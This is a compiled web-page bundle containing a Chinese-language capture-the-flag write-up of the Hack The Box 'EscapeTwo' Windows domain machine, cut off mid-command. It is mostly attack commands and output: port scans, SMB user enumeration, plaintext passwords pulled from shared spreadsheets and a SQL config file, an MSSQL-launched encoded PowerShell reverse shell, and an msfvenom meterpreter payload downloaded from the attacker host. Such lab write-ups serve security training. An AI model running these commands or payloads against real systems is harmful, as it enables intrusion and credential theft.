"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[2125],{32354:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>h,frontMatter:()=>a,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"HackTheBox/Machines/EscapeTwo/index","title":"EscapeTwo","description":"Difficulty: Easy","source":"@site/docs/HackTheBox/Machines/EscapeTwo/index.md","sourceDirName":"HackTheBox/Machines/EscapeTwo","slug":"/HackTheBox/Machines/EscapeTwo/","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/EscapeTwo/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Machines/EscapeTwo/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"Dog","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Dog/"},"next":{"title":"Headless","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Headless/"}}');var i=t(74848),r=t(28453);const a={},o="EscapeTwo",l={},c=[{value:"\u4fe1\u606f\u641c\u96c6",id:"\u4fe1\u606f\u641c\u96c6",level:2},{value:"Windows SMB \u63a2\u6d4b",id:"windows-smb-\u63a2\u6d4b",level:2},{value:"Windows Mssql",id:"windows-mssql",level:2},{value:"\u6743\u9650\u7ef4\u6301 sequel\\sql_svc",id:"\u6743\u9650\u7ef4\u6301-sequelsql_svc",level:2},{value:"\u63d0\u6743\u81f3 ryan",id:"\u63d0\u6743\u81f3-ryan",level:2},{value:"\u6743\u9650\u7ef4\u6301 sequel\\ryan",id:"\u6743\u9650\u7ef4\u6301-sequelryan",level:2},{value:"FLAG - USER",id:"flag---user",level:2},{value:"BloodHound \u679a\u4e3e",id:"bloodhound-\u679a\u4e3e",level:2},{value:"Windows \u57df\u653b\u51fb",id:"windows-\u57df\u653b\u51fb",level:2},{value:"FLAG - ROOT",id:"flag---root",level:2}];function d(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",li:"li",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,r.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"escapetwo",children:"EscapeTwo"})}),"\n",(0,i.jsxs)(n.admonition,{type:"info",children:[(0,i.jsx)(n.p,{children:"Difficulty: Easy"}),(0,i.jsx)(n.p,{children:"Operating System: Windows"}),(0,i.jsx)(n.p,{children:"Machine Information"}),(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su"}),"\n",(0,i.jsxs)(n.p,{children:["\u6b63\u5982\u73b0\u5b9e\u751f\u6d3b\u4e2d\u7684 Windows \u6e17\u900f\u6d4b\u8bd5\u4e2d\u5e38\u89c1\u7684\u90a3\u6837\uff0c\u60a8\u5c06\u4ece\u4ee5\u4e0b\u8d26\u6237\u7684\u51ed\u636e\u5f00\u59cb\u8fdb\u884c\u6b64\u6d4b\u8bd5\uff1a",(0,i.jsx)(n.code,{children:"rose / KxEPkKe6R8su"})]}),"\n"]})]}),"\n",(0,i.jsx)(n.h2,{id:"\u4fe1\u606f\u641c\u96c6",children:"\u4fe1\u606f\u641c\u96c6"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo ./tools/fscan-1.8.4/fscan -h 10.10.11.51\nstart infoscan\n10.10.11.51:135 open\n10.10.11.51:445 open\n10.10.11.51:139 open\n10.10.11.51:1433 open\n10.10.11.51:88 open\n[*] alive ports len is: 5\nstart vulscan\n[*] NetInfo\n[*]10.10.11.51\n   [->]DC01\n   [->]10.10.11.51\n\u5df2\u5b8c\u6210 5/5\n[*] \u626b\u63cf\u7ed3\u675f, \u8017\u65f6: 58.843735496s\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo nmap -v --min-rate=2000 -A -p- 10.10.11.51\nNmap scan report for bogon (10.10.11.51)\nHost is up (0.11s latency).\nNot shown: 65509 filtered tcp ports (no-response)\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-03 00:46:14Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-04-03T00:47:55+00:00; -18m55s from scanner time.\n| ssl-cert: Subject: commonName=DC01.sequel.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb\n| Issuer: commonName=sequel-DC01-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-06-08T17:35:00\n| Not valid after:  2025-06-08T17:35:00\n| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff\n|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC01.sequel.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb\n| Issuer: commonName=sequel-DC01-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-06-08T17:35:00\n| Not valid after:  2025-06-08T17:35:00\n| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff\n|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5\n|_ssl-date: 2025-04-03T00:47:55+00:00; -18m55s from scanner time.\n1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n|_ssl-date: 2025-04-03T00:47:55+00:00; -18m55s from scanner time.\n| ms-sql-info:\n|   10.10.11.51:1433:\n|     Version:\n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n| ms-sql-ntlm-info:\n|   10.10.11.51:1433:\n|     Target_Name: SEQUEL\n|     NetBIOS_Domain_Name: SEQUEL\n|     NetBIOS_Computer_Name: DC01\n|     DNS_Domain_Name: sequel.htb\n|     DNS_Computer_Name: DC01.sequel.htb\n|     DNS_Tree_Name: sequel.htb\n|_    Product_Version: 10.0.17763\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Issuer: commonName=SSL_Self_Signed_Fallback\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2025-04-03T00:40:46\n| Not valid after:  2055-04-03T00:40:46\n| MD5:   dc66:46d4:ae3f:df90:9eb8:8128:8bbc:2fbd\n|_SHA-1: 00a2:38e8:66b1:2bc0:6476:f7ce:8551:8126:d81d:b51f\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC01.sequel.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb\n| Issuer: commonName=sequel-DC01-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-06-08T17:35:00\n| Not valid after:  2025-06-08T17:35:00\n| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff\n|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5\n|_ssl-date: 2025-04-03T00:47:55+00:00; -18m55s from scanner time.\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC01.sequel.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb\n| Issuer: commonName=sequel-DC01-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-06-08T17:35:00\n| Not valid after:  2025-06-08T17:35:00\n| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff\n|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5\n|_ssl-date: 2025-04-03T00:47:55+00:00; -18m55s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49690/tcp open  msrpc         Microsoft Windows RPC\n49693/tcp open  msrpc         Microsoft Windows RPC\n49706/tcp open  msrpc         Microsoft Windows RPC\n49722/tcp open  msrpc         Microsoft Windows RPC\n49743/tcp open  msrpc         Microsoft Windows RPC\n49804/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019|10 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10\nAggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nTCP Sequence Prediction: Difficulty=256 (Good luck!)\nIP ID Sequence Generation: Incremental\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5728\u626b\u63cf\u7ed3\u679c\u4e2d\u5f97\u5230\u4e24\u4e2a\u4e3b\u673a\u540d\uff0c\u5c06\u5176\u6dfb\u52a0\u5230 ",(0,i.jsx)(n.code,{children:"/etc/hosts"})]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"DC01.sequel.htb"}),"\n",(0,i.jsx)(n.li,{children:"sequel.htb"}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"windows-smb-\u63a2\u6d4b",children:"Windows SMB \u63a2\u6d4b"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ crackmapexec smb sequel.htb -u "rose" -p "KxEPkKe6R8su" --rid-brute\nSMB         sequel.htb      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)\nSMB         sequel.htb      445    DC01             [+] sequel.htb\\rose:KxEPkKe6R8su\nSMB         sequel.htb      445    DC01             [+] Brute forcing RIDs\nSMB         sequel.htb      445    DC01             498: SEQUEL\\Enterprise Read-only Domain Controllers (SidTypeGroup)\nSMB         sequel.htb      445    DC01             500: SEQUEL\\Administrator (SidTypeUser)\nSMB         sequel.htb      445    DC01             501: SEQUEL\\Guest (SidTypeUser)\nSMB         sequel.htb      445    DC01             502: SEQUEL\\krbtgt (SidTypeUser)\nSMB         sequel.htb      445    DC01             512: SEQUEL\\Domain Admins (SidTypeGroup)\nSMB         sequel.htb      445    DC01             513: SEQUEL\\Domain Users (SidTypeGroup)\nSMB         sequel.htb      445    DC01             514: SEQUEL\\Domain Guests (SidTypeGroup)\nSMB         sequel.htb      445    DC01             515: SEQUEL\\Domain Computers (SidTypeGroup)\nSMB         sequel.htb      445    DC01             516: SEQUEL\\Domain Controllers (SidTypeGroup)\nSMB         sequel.htb      445    DC01             517: SEQUEL\\Cert Publishers (SidTypeAlias)\nSMB         sequel.htb      445    DC01             518: SEQUEL\\Schema Admins (SidTypeGroup)\nSMB         sequel.htb      445    DC01             519: SEQUEL\\Enterprise Admins (SidTypeGroup)\nSMB         sequel.htb      445    DC01             520: SEQUEL\\Group Policy Creator Owners (SidTypeGroup)\nSMB         sequel.htb      445    DC01             521: SEQUEL\\Read-only Domain Controllers (SidTypeGroup)\nSMB         sequel.htb      445    DC01             522: SEQUEL\\Cloneable Domain Controllers (SidTypeGroup)\nSMB         sequel.htb      445    DC01             525: SEQUEL\\Protected Users (SidTypeGroup)\nSMB         sequel.htb      445    DC01             526: SEQUEL\\Key Admins (SidTypeGroup)\nSMB         sequel.htb      445    DC01             527: SEQUEL\\Enterprise Key Admins (SidTypeGroup)\nSMB         sequel.htb      445    DC01             553: SEQUEL\\RAS and IAS Servers (SidTypeAlias)\nSMB         sequel.htb      445    DC01             571: SEQUEL\\Allowed RODC Password Replication Group (SidTypeAlias)\nSMB         sequel.htb      445    DC01             572: SEQUEL\\Denied RODC Password Replication Group (SidTypeAlias)\nSMB         sequel.htb      445    DC01             1000: SEQUEL\\DC01$ (SidTypeUser)\nSMB         sequel.htb      445    DC01             1101: SEQUEL\\DnsAdmins (SidTypeAlias)\nSMB         sequel.htb      445    DC01             1102: SEQUEL\\DnsUpdateProxy (SidTypeGroup)\nSMB         sequel.htb      445    DC01             1103: SEQUEL\\michael (SidTypeUser)\nSMB         sequel.htb      445    DC01             1114: SEQUEL\\ryan (SidTypeUser)\nSMB         sequel.htb      445    DC01             1116: SEQUEL\\oscar (SidTypeUser)\nSMB         sequel.htb      445    DC01             1122: SEQUEL\\sql_svc (SidTypeUser)\nSMB         sequel.htb      445    DC01             1128: SEQUEL\\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)\nSMB         sequel.htb      445    DC01             1129: SEQUEL\\SQLRUserGroupSQLEXPRESS (SidTypeAlias)\nSMB         sequel.htb      445    DC01             1601: SEQUEL\\rose (SidTypeUser)\nSMB         sequel.htb      445    DC01             1602: SEQUEL\\Management Department (SidTypeGroup)\nSMB         sequel.htb      445    DC01             1603: SEQUEL\\Sales Department (SidTypeGroup)\nSMB         sequel.htb      445    DC01             1604: SEQUEL\\Accounting Department (SidTypeGroup)\nSMB         sequel.htb      445    DC01             1605: SEQUEL\\Reception Department (SidTypeGroup)\nSMB         sequel.htb      445    DC01             1606: SEQUEL\\Human Resources Department (SidTypeGroup)\nSMB         sequel.htb      445    DC01             1607: SEQUEL\\ca_svc (SidTypeUser)\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u5c1d\u8bd5\u5217\u51fa\u5171\u4eab\u76ee\u5f55"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ smbclient -U rose -L 10.10.11.51\nPassword for [WORKGROUP\\rose]:\n\n        Sharename               Type      Comment\n        ---------               ----      -------\n        Accounting Department   Disk\n        ADMIN$                  Disk      Remote Admin\n        C$                      Disk      Default share\n        IPC$                    IPC       Remote IPC\n        NETLOGON                Disk      Logon server share\n        SYSVOL                  Disk      Logon server share\n        Users                   Disk\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.11.51 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u770b\u4e00\u4e0b ",(0,i.jsx)(n.code,{children:"Accounting Department"})," \u8fd9\u4e2a\u5171\u4eab\u6709\u4ec0\u4e48\u4e1c\u897f"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ smbclient //10.10.11.51/'Accounting Department' -U rose\nPassword for [WORKGROUP\\rose]:\nTry \"help\" to get a list of possible commands.\nsmb: \\> dir\n  .                                   D        0  Sun Jun  9 18:52:21 2024\n  ..                                  D        0  Sun Jun  9 18:52:21 2024\n  accounting_2024.xlsx                A    10217  Sun Jun  9 18:14:49 2024\n  accounts.xlsx                       A     6780  Sun Jun  9 18:52:07 2024\n\n                6367231 blocks of size 4096. 928869 blocks available\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5c06\u4e24\u4e2a ",(0,i.jsx)(n.code,{children:"xlsx"})," \u8868\u683c\u6587\u4ef6\u4e0b\u8f7d\u4e0b\u6765\u67e5\u770b"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"smb: \\> get accounting_2024.xlsx\ngetting file \\accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (26.8 KiloBytes/sec) (average 26.8 KiloBytes/sec)\nsmb: \\> get accounts.xlsx\ngetting file \\accounts.xlsx of size 6780 as accounts.xlsx (18.4 KiloBytes/sec) (average 22.7 KiloBytes/sec)\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u4f46\u662f\u51fa\u4e8e\u672a\u77e5\u539f\u56e0\uff0c\u4e0b\u8f7d\u5f97\u5230\u7684 xlsx \u6587\u4ef6\u5b58\u5728\u6709\u6570\u636e\u5757\u9519\u8bef"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:t(18014).A+"",width:"2560",height:"1540"})}),"\n",(0,i.jsxs)(n.p,{children:["\u624b\u52a8\u8fdb\u884c\u4fee\u590d\u4e4b\u540e\uff0c\u5728 ",(0,i.jsx)(n.code,{children:"accounts.xlsx"})," \u6587\u4ef6\u4e2d\u5f97\u5230\u4ee5\u4e0b\u51ed\u636e"]}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{style:{textAlign:"center"},children:"First Name"}),(0,i.jsx)(n.th,{style:{textAlign:"center"},children:"Last Name"}),(0,i.jsx)(n.th,{style:{textAlign:"center"},children:"Email"}),(0,i.jsx)(n.th,{style:{textAlign:"center"},children:"Username"}),(0,i.jsx)(n.th,{style:{textAlign:"center"},children:"Password"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"Angela"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"Martin"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:(0,i.jsx)(n.code,{children:"angela@sequel.htb"})}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"angela"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"0fwz7Q4mSpurIt99"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"Oscar"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"Martinez"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:(0,i.jsx)(n.code,{children:"oscar@sequel.htb"})}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"oscar"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"86LxLBMgEWaKUnBG"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"Kevin"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"Malone"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:(0,i.jsx)(n.code,{children:"kevin@sequel.htb"})}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"kevin"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"Md9Wlq1E5bZnVDVo"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"NULL"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"NULL"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:(0,i.jsx)(n.code,{children:"sa@sequel.htb"})}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"sa"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"MSSQLP@ssw0rd!"})]})]})]}),"\n",(0,i.jsx)(n.h2,{id:"windows-mssql",children:"Windows Mssql"}),"\n",(0,i.jsxs)(n.p,{children:["\u7ed3\u5408\u626b\u63cf\u5230\u7684 ",(0,i.jsx)(n.code,{children:"mssql"})," \u670d\u52a1\uff0c\u4ee5\u53ca\u6cc4\u9732\u7684 ",(0,i.jsx)(n.code,{children:"sa@sequel.htb"})," \u51ed\u636e\uff0c\u5c1d\u8bd5\u767b\u5f55 mssql \u670d\u52a1"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ netexec mssql sequel.htb -u sa -p MSSQLP@ssw0rd!\n[*] First time use detected\n[*] Creating home directory structure\n[*] Creating missing folder logs\n[*] Creating missing folder modules\n[*] Creating missing folder protocols\n[*] Creating missing folder workspaces\n[*] Creating missing folder obfuscated_scripts\n[*] Creating missing folder screenshots\n[*] Creating default workspace\n[*] Initializing WINRM protocol database\n[*] Initializing SMB protocol database\n[*] Initializing LDAP protocol database\n[*] Initializing SSH protocol database\n[*] Initializing RDP protocol database\n[*] Initializing WMI protocol database\n[*] Initializing MSSQL protocol database\n[*] Initializing NFS protocol database\n[*] Initializing VNC protocol database\n[*] Initializing FTP protocol database\n[*] Copying default configuration file\nMSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)\nMSSQL       10.10.11.51     1433   DC01             [-] sequel.htb\\sa:MSSQLP@ssw0rd! (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ netexec mssql sequel.htb -u sa -p MSSQLP@ssw0rd! --local-auth\nMSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)\nMSSQL       10.10.11.51     1433   DC01             [+] DC01\\sa:MSSQLP@ssw0rd! (Pwn3d!)\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5c1d\u8bd5\u57fa\u4e8e mssql \u670d\u52a1\u53cd\u5f39 shell"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"# Session 1\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ netexec mssql sequel.htb -u sa -p MSSQLP@ssw0rd! --local-auth -x 'powershell -e J.........pAA=='\nMSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)\nMSSQL       10.10.11.51     1433   DC01             [+] DC01\\sa:MSSQLP@ssw0rd! (Pwn3d!)\nMSSQL       10.10.11.51     1433   DC01             [-] Execute command failed, error: 'NXCAdapter' object has no attribute 'merge_extra'\n\n# Session 2\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ nc -lvnp 9999\nlistening on [any] 9999 ...\nconnect to [10.10.16.31] from (UNKNOWN) [10.10.11.51] 50242\nwhoami\nsequel\\sql_svc\nPS C:\\Windows\\system32>\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\u6743\u9650\u7ef4\u6301-sequelsql_svc",children:"\u6743\u9650\u7ef4\u6301 sequel\\sql_svc"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:'# Kali\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.31 LPORT=9111 -f exe -o 10.10.16.31-9111.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of exe file: 73802 bytes\nSaved as: 10.10.16.31-9111.exe\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.51 - - [03/Apr/2025 09:58:00] "GET /10.10.16.31-9111.exe HTTP/1.1" 200 -\n\n# Machine\nPS C:\\Windows\\system32> Invoke-WebRequest -Uri 10.10.16.31/10.10.16.31-9111.exe -OutFile C:\\\\Users\\\\Public\\\\Downloads\\\\exp.exe\nPS C:\\Windows\\system32> ls C:\\\\Users\\\\Public\\\\Downloads\n\n\n    Directory: C:\\Users\\Public\\Downloads\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----         4/2/2025   6:43 PM          73802 exp.exe\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u90e8\u7f72\u8f7d\u8377\u4e4b\u540e\uff0c\u5efa\u7acb\u76d1\u542c\u63a5\u6536 C2 \u4f1a\u8bdd"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"msf6 > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set LHOST 0.0.0.0\nLHOST => 0.0.0.0\nmsf6 exploit(multi/handler) > set LPORT 9111\nLPORT => 9111\nmsf6 exploit(multi/handler) > exploit\n[*] Started reverse TCP handler on 0.0.0.0:9111\n[*] Sending stage (177734 bytes) to 10.10.11.51\n[*] Meterpreter session 1 opened (10.10.16.31:9111 -> 10.10.11.51:56065) at 2025-04-03 10:02:45 +0800\n\nmeterpreter > sysinfo\nComputer        : DC01\nOS              : Windows Server 2019 (10.0 Build 17763).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : SEQUEL\nLogged On Users : 11\nMeterpreter     : x86/windows\nmeterpreter > getuid\nServer username: SEQUEL\\sql_svc\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\u63d0\u6743\u81f3-ryan",children:"\u63d0\u6743\u81f3 ryan"}),"\n",(0,i.jsxs)(n.p,{children:["\u4ee5 ",(0,i.jsx)(n.code,{children:"SEQUEL\\sql_svc"})," \u7528\u6237\u7684\u6743\u9650\uff0c\u5728\u9776\u673a\u4e0a\u641c\u96c6\u4fe1\u606f\uff0c\u5f97\u5230"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",metastring:'title="C:\\SQL2019\\ExpressAdv_ENU\\sql-Configuration.INI"',children:'[OPTIONS]\nACTION="Install"\nQUIET="True"\nFEATURES=SQL\nINSTANCENAME="SQLEXPRESS"\nINSTANCEID="SQLEXPRESS"\nRSSVCACCOUNT="NT Service\\ReportServer$SQLEXPRESS"\nAGTSVCACCOUNT="NT AUTHORITY\\NETWORK SERVICE"\nAGTSVCSTARTUPTYPE="Manual"\nCOMMFABRICPORT="0"\nCOMMFABRICNETWORKLEVEL=""0"\nCOMMFABRICENCRYPTION="0"\nMATRIXCMBRICKCOMMPORT="0"\nSQLSVCSTARTUPTYPE="Automatic"\nFILESTREAMLEVEL="0"\nENABLERANU="False"\nSQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"\nSQLSVCACCOUNT="SEQUEL\\sql_svc"\nSQLSVCPASSWORD="WqSZAF6CysDQbGb3"\nSQLSYSADMINACCOUNTS="SEQUEL\\Administrator"\nSECURITYMODE="SQL"\nSAPWD="MSSQLP@ssw0rd!"\nADDCURRENTUSERASSQLADMIN="False"\nTCPENABLED="1"\nNPENABLED="1"\nBROWSERSVCSTARTUPTYPE="Automatic"\nIAcceptSQLServerLicenseTerms=True\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u5c1d\u8bd5\u4f7f\u7528 ",(0,i.jsx)(n.code,{children:"ryan:WqSZAF6CysDQbGb3"})," \u8fd9\u4e2a\u51ed\u636e\uff0c\u901a\u8fc7 ",(0,i.jsx)(n.code,{children:"evil-winrm"})," \u8fdb\u884c\u653b\u51fb"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3\n\nEvil-WinRM shell v3.7\n\nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents> whoami\nsequel\\ryan\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\u6743\u9650\u7ef4\u6301-sequelryan",children:"\u6743\u9650\u7ef4\u6301 sequel\\ryan"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"msf6 exploit(multi/handler) > exploit\n[*] Started 